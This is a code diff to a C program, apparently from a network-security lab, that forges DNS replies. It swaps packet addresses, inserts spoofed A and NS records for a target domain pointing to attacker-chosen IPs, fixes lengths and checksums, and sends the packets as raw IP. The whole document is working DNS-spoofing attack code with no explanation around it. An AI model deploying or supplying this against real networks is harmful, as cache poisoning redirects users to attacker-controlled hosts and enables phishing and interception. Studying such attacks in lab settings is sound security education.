@@ -71,7 +71,7 @@ void spoof_DNS_reply(struct ipheader* ip)
     // Construct IP: swap src and dest in faked DNS packet
     newip->iph_sourceip = ip->iph_destip;
     newip->iph_destip = ip->iph_sourceip;
-    newip->iph_ttl = 20;
+    newip->iph_ttl = 200;
     newip->iph_protocol = IPPROTO_UDP; 
 
     
@@ -79,8 +79,8 @@ void spoof_DNS_reply(struct ipheader* ip)
     //Calculate the checksum for integrity. UDP checksum includes the data 
     newudp->udp_sum = 0; // Set it to zero first
     newudp->udp_sum = in_cksum((unsigned short *)newudp, ntohs(ip->iph_len) - ip_header_len);
-    newudp->udp_sport = udp->udp_dport;
-    newudp->udp_dport = udp->udp_sport;
+    newudp->udp_sport = (udp->udp_dport);
+    newudp->udp_dport = (udp->udp_sport);
 
     int increment = 8 + (newip->iph_ihl * 4);
 
@@ -88,8 +88,8 @@ void spoof_DNS_reply(struct ipheader* ip)
     //int udp_header_len = ip->iph_ihl * 4;
     
     struct dnsheader* dns = (struct dnsheader *) ((u_char *)udp + 8);//udp packet always 8 bytes
-    construct_dns_reply(buffer + increment);
-
+    int dnsSectionLength = construct_dns_reply(buffer + increment);
+    newip->iph_len = htons(increment + dnsSectionLength);
     send_raw_ip_packet(newip);
 }
 
@@ -118,7 +118,7 @@ unsigned short construct_dns_reply(char *buffer)
 	dns->QDCOUNT=htons(1); // 1 question field
 	dns->ANCOUNT=htons(1); // 1 answer field
 	dns->NSCOUNT=htons(1); // 1 name server(authority) field
-	dns->ARCOUNT=htons(1); // 1 additional fields
+	dns->ARCOUNT=htons(0); // 1 additional fields
 
 	char *p = buffer + 12; // move the pointer to the beginning of DNS data
 
@@ -128,9 +128,9 @@ unsigned short construct_dns_reply(char *buffer)
 
 	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)
 
-	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
+	p += set_A_record(p, TARGET_DOMAIN, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
 	p += set_NS_record(p, TARGET_DOMAIN, 0, NS_SERVER); //Add an NS record (Authority section)
-	p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
+	//p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
 	//printf("dns Length is %i",(p - buffer));
 	return p - buffer;
 }
@@ -149,7 +149,7 @@ unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr
 		p++;
 	} else {
 		strcpy(p, name);
-		p += strlen(name) + 1;
+		p += strlen(name)  + 1;
 	}
 
 	*((unsigned short *)p ) = htons(0x0001);	//Record Type
